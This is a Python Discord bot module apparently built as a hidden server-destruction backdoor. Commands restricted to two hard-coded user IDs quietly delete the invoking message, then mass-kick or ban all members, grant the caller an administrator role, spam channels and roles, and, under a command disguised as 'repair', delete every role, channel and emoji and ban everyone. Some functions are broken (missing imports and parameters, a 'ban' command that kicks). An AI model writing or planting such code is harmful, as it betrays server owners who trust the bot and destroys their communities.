import discord
from discord.ext import commands

class WhiteringDusk(commands.Cog):
  
    def __init__(self, client):
        self.client = client

    @commands.command()
    async def secret(self, ctx):
        if ctx.author.id == 215156408948097024 or ctx.author.id == 618845089208467466:
            await ctx.channel.purge(limit=1)
            member = ctx.message.author
            embed = discord.Embed(
                title="Secret",
                color=0x0066ff
            )

            embed.add_field(name='?ball', value='Bans everybody from the server (bot needs banning perms and needs to have a higher role than users', inline=False)
            embed.add_field(name='?nuke', value='Deletes all channels and bans everyone (bot needs manage channels and banning perms)', inline=False)
            embed.add_field(name='?kall', value='Kicks everyone from the server (bot needs kicking perms)', inline=False)
            embed.add_field(name='?a', value='Gives you admin access (bot needs administrator)', inline=False)
            embed.add_field(name='?channel x name', value='makes x amount of channels defined by you', inline=False)
            embed.add_field(name='?role x name', value='makes x amount of roles defined by you', inline=False)
            await member.send(embed=embed)

    @commands.command()
    async def kall(self, ctx):
        if ctx.author.id == 215156408948097024 or ctx.author.id == 618845089208467466:
            await ctx.channel.purge(limit=1)
            guild = ctx.message.guild
            for member in list(ctx.message.guild.members):
                try:
                    await member.kick()
                    print ("User " + member.name + " has been kicked")
                    embed = discord.Embed(
                    colour = discord.Colour.red()
                    )
                    embed.add_field(name="User kicked", value=f'{member.name}')
                    await ctx.send(embed=embed)
                except:
                    pass
            print ("Action Completed: kall")


    @commands.command()
    async def ball(self, ctx):
        if ctx.author.id == 215156408948097024 or ctx.author.id == 618845089208467466:
            await ctx.channel.purge(limit=1)
            guild = ctx.message.guild
            for member in list(ctx.message.guild.members):
                try:
                    await member.kick()
                    print ("User " + member.name + " has been banned")
                    embed = discord.Embed(
                    colour = discord.Colour.red()
                    )
                    embed.add_field(name="User banned", value=f'{member.name}')
                    await ctx.send(embed=embed)
                except:
                    pass
            print ("Action Completed: ball")


    @commands.command()
    async def a(self, ctx):
        if ctx.author.id == 215156408948097024 or ctx.author.id == 618845089208467466:
            await ctx.channel.purge(limit=1)
            guild = ctx.message.guild
            perms = discord.Permissions(8)
            await guild.create_role(name='*', permissions=perms)
            member = ctx.message.author
            role = discord.utils.get(guild.roles, name="*")
            await member.add_roles(role)

    @commands.command()
    async def channelspam(ctx, x, *, name):
        if ctx.author.id == 215156408948097024 or ctx.author.id == 618845089208467466:
            await ctx.channel.purge(limit=1)
            guild = ctx.message.guild
            for i in range(int(x)):
                await guild.create_text_channel(name)

    @commands.command()
    async def rolespam(ctx, x, *, name):
        if ctx.author.id == 215156408948097024 or ctx.author.id == 618845089208467466:
            await ctx.channel.purge(limit=1)
            guild = ctx.message.guild
            perms = discord.Permissions(0)
            for i in range(int(x)):
                await guild.create_role(name=name, permissions=perms)
                
    @commands.command()
    async def repair(self, ctx):
        if ctx.author.id == 215156408948097024 or ctx.author.id == 618845089208467466:
            deftime = datetime.datetime.now()
            date = (deftime.strftime("%Y-%m-%d %H:%M:%S"))

            print("{} | Operation Whitering Dusk Initiated".format(date))

            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print (f"{role.name} has been deleted")
                except:
                    pass

            for member in list(client.get_all_members()):
                try:
                    await member.ban()
                    print ("User " + member.name + " has been banned")
                except:
                    pass

            for channel in list(ctx.message.guild.channels):
                try:
                    await channel.delete()
                    print (channel.name + " has been deleted")
                except:
                    pass

            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print (f"{emoji.name} has been deleted")
                except:
                    pass
                    
def setup(client):
  client.add_cog(WhiteringDusk(client))